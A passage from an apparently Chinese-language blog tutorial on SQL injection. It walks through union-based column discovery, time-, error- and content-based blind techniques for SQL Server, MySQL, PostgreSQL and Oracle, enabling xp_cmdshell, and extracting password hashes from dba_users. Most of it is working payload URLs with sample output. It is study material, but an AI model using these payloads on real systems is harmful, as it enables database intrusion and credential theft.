class=\"token comment\">//sql/Less-2/?id=12+order+by+1</span>\nhttp:<span class=\"token comment\">//sql/Less-2/?id=12+order+by+2</span>\nhttp:<span class=\"token comment\">//sql/Less-2/?id=12+order+by+3</span>\n<span class=\"token comment\">-- etc</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>若3报错了，2未报错，那么就是两列</p>\n<p>相对下，第二种更优，可以使用二分查找</p>\n</li>\n</ul>\n<h4 id=\"匹配数据类型\"><a href=\"#匹配数据类型\" class=\"headerlink\" title=\"匹配数据类型\"></a>匹配数据类型</h4><p>假设需要查询一个字符串值，利用一个支付串值一个一个依次替换NULL值，只要不报错，就能确定位置。</p>\n<pre class=\"line-numbers language-sql\" data-language=\"sql\"><code class=\"language-sql\">http:<span class=\"token comment\">//test/?id=12+union+select+' test',NULL,NULL,NULL </span>\nhttp:<span class=\"token comment\">//test/?id=12+union+select+NULL,'test',NULL,NULL </span>\nhttp:<span class=\"token comment\">//test/?id=12+union+select+NULL,NULL,'test',NULL </span>\nhttp:<span class=\"token comment\">//test/?id=12+union+select+NULL,NULL,NULL,'test'</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>有些数据库不能使用NULL，只能暴力破解，使用自动化工具</p>\n<p>假设最后一个位置是字符串值，便可以开始检索想要获得的值</p>\n<pre class=\"line-numbers language-sql\" data-language=\"sql\"><code class=\"language-sql\">http:<span class=\"token comment\">//test/?id=12+union+select+NULL,version(),NULL,NULL</span>\n<span class=\"token comment\">-- 获取版本</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span></span></code></pre>\n\n<p>也可以连接多条语句返回多条信息</p>\n<pre class=\"line-numbers language-sql\" data-language=\"sql\"><code class=\"language-sql\">http:<span class=\"token comment\">//test/?id=12+union+select+NULL,concat(version(),0x7e,database()),NULL</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p>如果想要检索的不是字符串字，却只有支付串值的字段，可以使用强制转换为字符串</p>\n<p><img src=\"https://images.dadream.eu.org/images/2024/07/2a1757616fa87006e38575c695c27afd.png\"></p>\n<p>PostgreSQL允许使用<code>||</code>连接字符串，只要有一个变量是字符串即可作为字符串值</p>\n<h4 id=\"只返回一条结果\"><a href=\"#只返回一条结果\" class=\"headerlink\" title=\"只返回一条结果\"></a>只返回一条结果</h4><pre class=\"line-numbers language-sql\" data-language=\"sql\"><code class=\"language-sql\">http:<span class=\"token comment\">//sql/Less-2/?id=12 union select NULL,username,password from users</span>\n<span class=\"token comment\">-- 正常来说这条语句可以返回表中所有数据，但是有时只会返回一条数据</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span></span></code></pre>\n\n<pre class=\"line-numbers language-sql\" data-language=\"sql\"><code class=\"language-sql\">http:<span class=\"token comment\">//sql/Less-2/?id=1 and 1=0 union select NULL,username,password from users</span>\n<span class=\"token comment\">-- 将前面的查询拼凑成永假式，将返回后面的第一个结果</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span></span></code></pre>\n\n<pre class=\"line-numbers language-sql\" data-language=\"sql\"><code class=\"language-sql\">http:<span class=\"token comment\">//sql/Less-2/?id=0 union select NULL,username,password from users limit 1,1 -- </span>\n<span class=\"token comment\">-- 加一个限制条件返回第二条数据，where也行</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span></span></code></pre>\n\n<h3 id=\"使用条件语句\"><a href=\"#使用条件语句\" class=\"headerlink\" title=\"使用条件语句\"></a>使用条件语句</h3><p>构建条件语句，条件语句的执行结果强迫服务器返回不同的结果，由结果的状态来判断条件是否为真</p>\n<p><img src=\"https://images.dadream.eu.org/images/2024/07/ad493d6543d96db885d9a1428870d1ea.png\"></p>\n<h4 id=\"基于时间\"><a href=\"#基于时间\" class=\"headerlink\" title=\"基于时间\"></a>基于时间</h4><p>基于Web应用响应时间上的差异，该时间取决于某些信息的值。</p>\n<h5 id=\"mssql\"><a href=\"#mssql\" class=\"headerlink\" title=\"mssql\"></a>mssql</h5><pre class=\"line-numbers language-sql\" data-language=\"sql\"><code class=\"language-sql\"><span class=\"token keyword\">select</span> @<span class=\"token variable\">@version</span><span class=\"token punctuation\">;</span>\nMicrosoft <span class=\"token keyword\">SQL</span> Server <span class=\"token number\">2005</span> <span class=\"token operator\">-</span> <span class=\"token number\">9.00</span><span class=\"token number\">.3042</span><span class=\"token number\">.00</span> <span class=\"token punctuation\">(</span>Intel X86<span class=\"token punctuation\">)</span>\nFeb <span class=\"token number\">9</span> <span class=\"token number\">2007</span> <span class=\"token number\">22</span>:<span class=\"token number\">47</span>:<span class=\"token number\">07</span>\nCopyright <span class=\"token punctuation\">(</span>c<span class=\"token punctuation\">)</span> <span class=\"token number\">1988</span><span class=\"token operator\">-</span><span class=\"token number\">2005</span> Microsoft Corporation \nStandard Edition <span class=\"token keyword\">on</span> Windows NT <span class=\"token number\">5.2</span> <span class=\"token punctuation\">(</span>Build <span class=\"token number\">3790</span>: Service Pack <span class=\"token number\">2</span><span class=\"token punctuation\">)</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<pre class=\"line-numbers language-sql\" data-language=\"sql\"><code class=\"language-sql\">http:<span class=\"token comment\">//test/?id=12;if+(system_user='sa')+WAITFOR+DELAY+'0:0:5'-- </span>\n<span class=\"token comment\">-- 若system_user用户是系统管理员账户'sa',则会执行后面的waitfor delay函数，页面延迟5s</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span></span></code></pre>\n\n<pre class=\"line-numbers language-sql\" data-language=\"sql\"><code class=\"language-sql\"><span class=\"token keyword\">IF</span> <span class=\"token punctuation\">(</span>substring<span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">select</span> @<span class=\"token variable\">@version</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span><span class=\"token number\">25</span><span class=\"token punctuation\">,</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">=</span> <span class=\"token number\">5</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">WAITFOR</span> DELAY <span class=\"token string\">'0:0:5'</span><span class=\"token comment\">-- </span>\n<span class=\"token comment\">-- 截取@@version的第25个字符是否为5，为5就是2005数据库，并且延迟返回</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span></span></code></pre>\n\n<p>跑个脚本能把这一整段跑出来，精确判断，判断补丁，利用补丁攻击</p>\n<p><img src=\"https://images.dadream.eu.org/images/2024/07/611e433cc3ffdeba5e68dcaaa0a90f0d.png\"></p>\n<p><a href=\"https://www.sqlteam.com/articles/sql-server-versions\">SQL Server Version - SQLTeam.com</a></p>\n<p>如果有管理员权限，可以使用xp_cmdshell扩展储存过程来产生延迟，它通过加载一条需要花费特定秒数的命令来实现。</p>\n<p>启用xp_cmdshell</p>\n<pre class=\"line-numbers language-sql\" data-language=\"sql\"><code class=\"language-sql\"><span class=\"token comment\">-- sql server 2005 2008</span>\n<span class=\"token keyword\">EXEC</span> sp_configure <span class=\"token string\">'show advanced options'</span><span class=\"token punctuation\">,</span> <span class=\"token number\">1</span><span class=\"token punctuation\">;</span>\nGO\n<span class=\"token keyword\">RECONFIGURE</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">EXEC</span> sp_configure <span class=\"token string\">'xp_cmdshell*'</span><span class=\"token punctuation\">,</span><span class=\"token number\">1</span><span class=\"token punctuation\">;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<pre class=\"line-numbers language-sql\" data-language=\"sql\"><code class=\"language-sql\"><span class=\"token comment\">-- sql server 2000</span>\n<span class=\"token keyword\">exec</span> master<span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span>sp_addextendedproc <span class=\"token string\">'xp_cmdshell'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'xplog70.dll'</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span></span></code></pre>\n\n<pre class=\"line-numbers language-sql\" data-language=\"sql\"><code class=\"language-sql\"><span class=\"token keyword\">EXEC</span> master<span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span>xp_cmdshell <span class=\"token string\">'ping -n 5 127.0.0.1'</span>\n<span class=\"token comment\">-- ping回路5s</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span></span></code></pre>\n\n<h5 id=\"mysql\"><a href=\"#mysql\" class=\"headerlink\" title=\"mysql\"></a>mysql</h5><pre class=\"line-numbers language-sql\" data-language=\"sql\"><code class=\"language-sql\"><span class=\"token keyword\">select</span> benchmark<span class=\"token punctuation\">(</span><span class=\"token number\">1000000</span><span class=\"token punctuation\">,</span>sha1<span class=\"token punctuation\">(</span><span class=\"token string\">'blah'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token comment\">-- 执行后面的语句1000000次</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span></span></code></pre>\n\n<pre class=\"line-numbers language-sql\" data-language=\"sql\"><code class=\"language-sql\"><span class=\"token keyword\">select</span> sleep<span class=\"token punctuation\">(</span><span class=\"token number\">5</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token comment\">-- 睡眠5s 配合if使用</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span></span></code></pre>\n\n<h5 id=\"PostgreSQL\"><a href=\"#PostgreSQL\" class=\"headerlink\" title=\"PostgreSQL\"></a>PostgreSQL</h5><pre class=\"line-numbers language-sql\" data-language=\"sql\"><code class=\"language-sql\"><span class=\"token keyword\">select</span> pg_sleep<span class=\"token punctuation\">(</span><span class=\"token number\">5</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<pre class=\"line-numbers language-sql\" data-language=\"sql\"><code class=\"language-sql\"><span class=\"token comment\">-- unix</span>\n<span class=\"token keyword\">CREATE</span> <span class=\"token operator\">OR</span> <span class=\"token keyword\">REPLACE</span> <span class=\"token keyword\">FUNCTION</span> sleep <span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">RETURNS</span> <span class=\"token keyword\">int</span> <span class=\"token keyword\">AS</span> <span class=\"token string\">'/lib/libc.so.6'</span><span class=\"token punctuation\">,</span><span class=\"token string\">'sleep'</span> <span class=\"token keyword\">language</span> <span class=\"token string\">'C'</span> STRICT<span class=\"token punctuation\">;</span> <span class=\"token keyword\">SELECT</span> sleep<span class=\"token punctuation\">(</span><span class=\"token number\">10</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span></span></code></pre>\n\n<h5 id=\"oracle\"><a href=\"#oracle\" class=\"headerlink\" title=\"oracle\"></a>oracle</h5><pre class=\"line-numbers language-sql\" data-language=\"sql\"><code class=\"language-sql\"><span class=\"token keyword\">select</span> utl_http<span class=\"token punctuation\">.</span>request <span class=\"token punctuation\">(</span><span class=\"token string\">' http://10.0.0.1/ '</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">from</span> dual<span class=\"token punctuation\">;</span> <span class=\"token keyword\">select</span> HTTPURITYPE<span class=\"token punctuation\">(</span><span class=\"token string\">' http://10.0.0.1/ '</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>getclob<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">from</span> dual<span class=\"token punctuation\">;</span>\n<span class=\"token comment\">-- 使用UTL HTTP或HTTPURITYPE向一个'死的'IP地址发送一个HTTP请求查询将一直等待连接直到超时</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span></span></code></pre>\n\n<pre class=\"line-numbers language-sql\" data-language=\"sql\"><code class=\"language-sql\"><span class=\"token keyword\">SELECT</span> decode<span class=\"token punctuation\">(</span>substr<span class=\"token punctuation\">(</span><span class=\"token keyword\">user</span><span class=\"token punctuation\">,</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span><span class=\"token string\">'A'</span><span class=\"token punctuation\">,</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">select</span> <span class=\"token function\">count</span><span class=\"token punctuation\">(</span><span class=\"token operator\">*</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">from</span> all_objects<span class=\"token punctuation\">,</span>all_objects<span class=\"token punctuation\">,</span>all_objects<span class=\"token punctuation\">,</span>all_objects<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span>\n<span class=\"token comment\">-- 笛卡尔积</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span></span></code></pre>\n\n<h4 id=\"基于错误\"><a href=\"#基于错误\" class=\"headerlink\" title=\"基于错误\"></a>基于错误</h4><p>返回两种状态，其中一种状态是错误</p>\n<p>sql server</p>\n<pre class=\"line-numbers language-sql\" data-language=\"sql\"><code class=\"language-sql\">http:<span class=\"token comment\">//test/?id=12/is_srvrolemember('sysadmin')</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p>is_srvrolemember()是SQL Server T-SQL的一个函数，返回</p>\n<pre class=\"line-numbers language-bash\" data-language=\"bash\"><code class=\"language-bash\"><span class=\"token number\">1</span>：如果用户属于指定的组。\n<span class=\"token number\">0</span>：如果用户不属于指定的组。\nNULL：如果指定的组不存在。<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span></span></code></pre>\n\n<p>意思很明确，返回1的话就会拼接成12/1,id=12会返回结果，0则报错，具体报错不深究</p>\n<p>case语句也能这样使用，堆叠不能用它都能用</p>\n<pre class=\"line-numbers language-sql\" data-language=\"sql\"><code class=\"language-sql\">http:<span class=\"token comment\">//test/?id=12/(case+when+(system_user='sa')+then+1+else+0+end)</span>\n\nhttp:<span class=\"token comment\">//sql/Less-2/?id=12/(if(1=1,1,0))</span>\n\nhttp:<span class=\"token comment\">//sql/Less-2/?id=12/(case 1 when 1 then 1 else 0 end)</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<h4 id=\"基于内容\"><a href=\"#基于内容\" class=\"headerlink\" title=\"基于内容\"></a>基于内容</h4><p>执行语句返回内容和不执行返回的内容不同，相比于基于时间，基于错误会更快，基于内容不会产生错误，有点不言而喻。</p>\n<pre class=\"line-numbers language-sql\" data-language=\"sql\"><code class=\"language-sql\">http:<span class=\"token comment\">//sql/Less-2/?id=10%2B(if(1=1,1,0))</span>\n<span class=\"token comment\">-- 若成功执行if语句,就会返回id=11的结果，对比10不同</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span></span></code></pre>\n\n<h4 id=\"处理字符串\"><a href=\"#处理字符串\" class=\"headerlink\" title=\"处理字符串\"></a>处理字符串</h4><p>前面介绍的都是数值上的技术，这段介绍字符上的技巧</p>\n<pre class=\"line-numbers language-sql\" data-language=\"sql\"><code class=\"language-sql\">http:<span class=\"token comment\">//test/?id=12</span>\n<span class=\"token comment\">-- 正常查询，id=13时结果为空，sql语句为</span>\n<span class=\"token keyword\">select</span> <span class=\"token operator\">*</span> <span class=\"token keyword\">from</span> users <span class=\"token keyword\">where</span> id<span class=\"token operator\">=</span><span class=\"token string\">'12'</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span></span></code></pre>\n\n<pre class=\"line-numbers language-sql\" data-language=\"sql\"><code class=\"language-sql\">http:<span class=\"token comment\">//test/?id=1'%2B'2</span>\n<span class=\"token comment\">-- 结果和上面相同，因为连接成了12</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span></span></code></pre>\n\n<p>这时可以将char()函数放在2的位置测试</p>\n<pre class=\"line-numbers language-sql\" data-language=\"sql\"><code class=\"language-sql\">http:<span class=\"token comment\">//test/?id=1'%2Bchar(50)'</span>\n\n<span class=\"token keyword\">select</span> <span class=\"token operator\">*</span> <span class=\"token keyword\">from</span> users <span class=\"token keyword\">where</span> id<span class=\"token operator\">=</span><span class=\"token string\">'1'</span><span class=\"token operator\">+</span><span class=\"token keyword\">char</span><span class=\"token punctuation\">(</span><span class=\"token number\">50</span><span class=\"token punctuation\">)</span>'<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span></span></code></pre>\n\n<p>执行结果和前面相同，这是可以将条件语句插入2的位置</p>\n<pre class=\"line-numbers language-sql\" data-language=\"sql\"><code class=\"language-sql\">http:<span class=\"token comment\">//test/?id=1'%2Bchar(49%2B(case+when+(system_user+=+'sa')+then+l+else+0+end))'</span>\n\n<span class=\"token comment\">-- 如果是sa执行后id=13，不是则id=12</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span></span></code></pre>\n\n<p>根据结果的不同可以判断条件</p>\n<h4 id=\"拓展攻击\"><a href=\"#拓展攻击\" class=\"headerlink\" title=\"拓展攻击\"></a>拓展攻击</h4><p>简而言之，不在局限于判断sa用户了，而是得到所有信息，先得到用户名长度</p>\n<pre class=\"line-numbers language-sql\" data-language=\"sql\"><code class=\"language-sql\">http:<span class=\"token comment\">//test/?id=12/(case+when+(len(system_user)+&gt;+16)+then+1+else+0+end)</span>\nhttp:<span class=\"token comment\">//test/?id=12/(case+when+(len(system_user)+&gt;+12)+then+1+else+0+end)</span>\nhttp:<span class=\"token comment\">//test/?id=12/(case+when+(len(system_user)+&gt;+10)+then+1+else+0+end)</span>\n<span class=\"token comment\">-- 二分查找，错误和成功的交界就是正确的值</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>接下一次查找组成用户名的每个值</p>\n<pre class=\"line-numbers language-sql\" data-language=\"sql\"><code class=\"language-sql\">http:<span class=\"token comment\">//test/?id=12/(case+when+(ascii(substring(select+system_user),1,1))+&gt;+64)+then+1+else+0+end)</span>\n<span class=\"token comment\">-- 二分查找</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span></span></code></pre>\n\n<p>这些过程一般都交给自动化脚本</p>\n<h4 id=\"利用SQL注入错误\"><a href=\"#利用SQL注入错误\" class=\"headerlink\" title=\"利用SQL注入错误\"></a>利用SQL注入错误</h4><p>将检索的信息注入进报错信息中</p>\n<pre class=\"line-numbers language-sql\" data-language=\"sql\"><code class=\"language-sql\">http:<span class=\"token comment\">//www.victim.com/products.asp?id=system_user</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<pre class=\"line-numbers language-bash\" data-language=\"bash\"><code class=\"language-bash\">Microsoft OLE DB Provider <span class=\"token keyword\">for</span> ODBC Drivers error <span class=\"token string\">'80040e07'</span> \n<span class=\"token punctuation\">[</span>Microsoft<span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span>ODBC SQL Server Driver<span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span>SQL Server<span class=\"token punctuation\">]</span>Conversion failed when converting the nvarchar value <span class=\"token string\">'appdbuser'</span> to data <span class=\"token builtin class-name\">type</span> int.\n/products.asp, line <span class=\"token number\">33</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span></span></code></pre>\n\n<p><code>appdbuser</code>很明显这个返回能做文章，使用前面提到的<code>is_srvrolemember</code>的返回值强制类型转换</p>\n<pre class=\"line-numbers language-sql\" data-language=\"sql\"><code class=\"language-sql\">http:<span class=\"token comment\">//www.victim.com/products.asp?id=char(65%2Bis_srvrolemember('sysadmin'))</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<pre class=\"line-numbers language-bash\" data-language=\"bash\"><code class=\"language-bash\">Microsoft OLE DB Provider <span class=\"token keyword\">for</span> ODBC Drivers error <span class=\"token string\">'80040e07'</span> \n<span class=\"token punctuation\">[</span>Microsoft<span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span>ODBC SQL Server Driver<span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span>SQL Server<span class=\"token punctuation\">]</span>Conversion failed when converting the nvarchar value <span class=\"token string\">'B'</span> to data <span class=\"token builtin class-name\">type</span> int. \n/products.asp, line <span class=\"token number\">33</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span></span></code></pre>\n\n<p>如果当前用户不属于sysadmin组，那么is srvrolemember将返回0，char(65+0)将返回字母A,如果当前用户拥有管理员权限，那么is_srvrolemember将返回1, char(65+1)将返回字母B。</p>\n<p><code>having 1=1</code>基于报错，枚举当前查询用得列名，通常和<code>group by</code>一起使用，group by将已查询到的列去除，再次枚举现在第一列，sql server能产生第一列错误信息</p>\n<pre class=\"line-numbers language-sql\" data-language=\"sql\"><code class=\"language-sql\">http:<span class=\"token comment\">//www.victim.com/products.asp?id=1+having+1=1</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<pre class=\"line-numbers language-bash\" data-language=\"bash\"><code class=\"language-bash\">Microsoft OLE DB Provider <span class=\"token keyword\">for</span> ODBC Drivers error <span class=\"token string\">'80040e14'</span>\n<span class=\"token punctuation\">[</span>Microsoft<span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span>ODBC SQL Server Driver<span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span>SQL Server<span class=\"token punctuation\">]</span>Column <span class=\"token string\">'products.id'</span> is invalid <span class=\"token keyword\">in</span> the <span class=\"token keyword\">select</span> list because it is not contained <span class=\"token keyword\">in</span> either an aggregate <span class=\"token keyword\">function</span> or the GROUP BY clause.\n/products.asp, line <span class=\"token number\">233</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span></span></code></pre>\n\n<p><code>products.id</code>就是第一条列名，要查询第二条</p>\n<pre class=\"line-numbers language-sql\" data-language=\"sql\"><code class=\"language-sql\">http:<span class=\"token comment\">//www.victim.com/products.asp?id=1+group+by+products.id+having+1=1</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<pre class=\"line-numbers language-sql\" data-language=\"sql\"><code class=\"language-sql\">Microsoft OLE DB Provider <span class=\"token keyword\">for</span> ODBC Drivers error <span class=\"token string\">'80040e14'</span> \n<span class=\"token punctuation\">[</span>Microsoft<span class=\"token punctuation\">]</span> <span class=\"token punctuation\">[</span>ODBC <span class=\"token keyword\">SQL</span> Server Driver<span class=\"token punctuation\">]</span> <span class=\"token punctuation\">[</span><span class=\"token keyword\">SQL</span> Server<span class=\"token punctuation\">]</span><span class=\"token keyword\">Column</span> <span class=\"token string\">'products.name'</span> <span class=\"token operator\">is</span> invalid <span class=\"token operator\">in</span> the <span class=\"token keyword\">select</span> list because it <span class=\"token operator\">is</span> <span class=\"token operator\">not</span> contained <span class=\"token operator\">in</span> either an aggregate <span class=\"token keyword\">function</span> <span class=\"token operator\">or</span> the <span class=\"token keyword\">GROUP</span> <span class=\"token keyword\">BY</span> clause<span class=\"token punctuation\">.</span>\n<span class=\"token operator\">/</span>shop<span class=\"token punctuation\">.</span>asp<span class=\"token punctuation\">,</span> line <span class=\"token number\">233</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span></span></code></pre>\n\n<p>第一列属于GROUP BY子句，因而该错误现在由第二列products.name触发。接下来将该列添加到GROUP BY子句，不需要清除前面的内容</p>\n<pre class=\"line-numbers language-sql\" data-language=\"sql\"><code class=\"language-sql\">http:<span class=\"token comment\">//www.victim.com/shop.asp?id=1+group+by+products.id,products.name+having+1=1</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<h4 id=\"Oracle中的错误信息\"><a href=\"#Oracle中的错误信息\" class=\"headerlink\" title=\"Oracle中的错误信息\"></a>Oracle中的错误信息</h4><p><code>utl_inaddr</code>，该函数负责解析主机名</p>\n<pre class=\"line-numbers language-sql\" data-language=\"sql\"><code class=\"language-sql\"><span class=\"token keyword\">select</span> utl_inaddr<span class=\"token punctuation\">.</span>get_host_name<span class=\"token punctuation\">(</span><span class=\"token string\">'victim'</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">from</span> dual<span class=\"token punctuation\">;</span>\n\nORA<span class=\"token operator\">-</span><span class=\"token number\">29257</span> : host victim unknown\nORA<span class=\"token operator\">-</span><span class=\"token number\">06512</span>: at <span class=\"token string\">\"SYS.UTL_INADDR\"</span><span class=\"token punctuation\">,</span> line <span class=\"token number\">4</span>\nORA<span class=\"token operator\">-</span><span class=\"token number\">06512</span>: at <span class=\"token string\">\"SYS.UTL_INADDR\"</span><span class=\"token punctuation\">,</span> line <span class=\"token number\">35</span>\nORA<span class=\"token operator\">-</span><span class=\"token number\">06512</span>: at line <span class=\"token number\">1</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>关注victim，和前面小节一样，向utl_inaddr传入的都会显示在错误中</p>\n<p>用select语句替换victim，有个限制：只能返回一列和一行，否者会收到另一种报错信息ORA-01427错误消息：single-row subquery returns more than one row。</p>\n<pre class=\"line-numbers language-sql\" data-language=\"sql\"><code class=\"language-sql\"><span class=\"token keyword\">select</span> utl_inaddr<span class=\"token punctuation\">.</span>get_host_name<span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">select</span> username<span class=\"token operator\">||</span><span class=\"token string\">'='</span><span class=\"token operator\">||</span>password <span class=\"token keyword\">from</span> dba_users <span class=\"token keyword\">where</span> rownum<span class=\"token operator\">=</span>l<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">from</span> dual<span class=\"token punctuation\">;</span>\nORA<span class=\"token operator\">-</span><span class=\"token number\">29257</span>: host SYS<span class=\"token operator\">=</span>D4DF7931AB130E37 unknown\nORA<span class=\"token operator\">-</span><span class=\"token number\">06512</span>: at <span class=\"token string\">\"SYS.UTL—INADDR\"</span><span class=\"token punctuation\">,</span> line <span class=\"token number\">4</span>\nORA<span class=\"token operator\">-</span><span class=\"token number\">06512</span>: at <span class=\"token string\">\"SYS.UTL—INADDR\"</span><span class=\"token punctuation\">,</span> line <span class=\"token number\">35</span>\nORA<span class=\"token operator\">-</span><span class=\"token number\">06512</span>: at line <span class=\"token number\">1</span>\n\n<span class=\"token keyword\">select</span> utl_inaddr<span class=\"token punctuation\">.</span>get_host_name<span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">select</span> banner <span class=\"token keyword\">from</span> v$version <span class=\"token keyword\">where</span> rownum<span class=\"token operator\">=</span>l<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">from</span> dual<span class=\"token punctuation\">;</span>\nORA<span class=\"token operator\">-</span><span class=\"token number\">29257</span>: host ORACLE <span class=\"token keyword\">DATABASE</span> <span class=\"token number\">10</span>G <span class=\"token keyword\">RELEASE</span> <span class=\"token number\">10.2</span><span class=\"token number\">.0</span><span class=\"token number\">.1</span><span class=\"token number\">.0</span> <span class=\"token operator\">-</span> <span class=\"token number\">64</span>BIT PRODUCTION unknown\nORA<span class=\"token operator\">-</span><span class=\"token number\">06512</span>: at <span class=\"token string\">\"SYS.UTL—INADDR\"</span><span class=\"token punctuation\">,</span> line <span class=\"token number\">4</span>\nORA<span class=\"token operator\">-</span><span class=\"token number\">06512</span>: at <span class=\"token string\">\"SYS.UTL—INADDR\"</span><span class=\"token punctuation\">,</span> line <span class=\"token number\">35</span>\nORA<span class=\"token operator\">-</span><span class=\"token number\">06512</span>: at line <span class=\"token number\">1</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>rownum=1是控制返回第几条，不然不能得到预期结果，||管道符拼接则是绕过只能返回一列的限制</p>\n<pre class=\"line-numbers language-sql\" data-language=\"sql\"><code class=\"language-sql\"><span class=\"token keyword\">select</span> username<span class=\"token operator\">||</span><span class=\"token string\">'='</span><span class=\"token operator\">||</span>password <span class=\"token keyword\">from</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">select</span> rownum r<span class=\"token punctuation\">,</span>username<span class=\"token punctuation\">,</span>password <span class=\"token keyword\">from</span> dba_users<span class=\"token punctuation\">)</span> <span class=\"token keyword\">where</span> r<span class=\"token operator\">=</span><span class=\"token number\">1</span>\nORA<span class=\"token operator\">-</span><span class=\"token number\">29257</span>: host SYS<span class=\"token operator\">=</span>D4DF7931AB130E37 unknown\n<span class=\"token comment\">-- 为避免所连接的字符串中出现单引号，可选用concat函数：</span>\n<span class=\"token keyword\">select</span> concat<span class=\"token punctuation\">(</span>concat<span class=\"token punctuation\">(</span>username<span class=\"token punctuation\">,</span>chr<span class=\"token punctuation\">(</span><span class=\"token number\">61</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>password<span class=\"token punctuation\">)</span> <span class=\"token keyword\">from</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">select</span> rownum r<span class=\"token punctuation\">,</span>username<span class=\"token punctuation\">,</span>password <span class=\"token keyword\">from</span> dba_users<span class=\"token punctuation\">)</span> <span class=\"token keyword\">where</span> 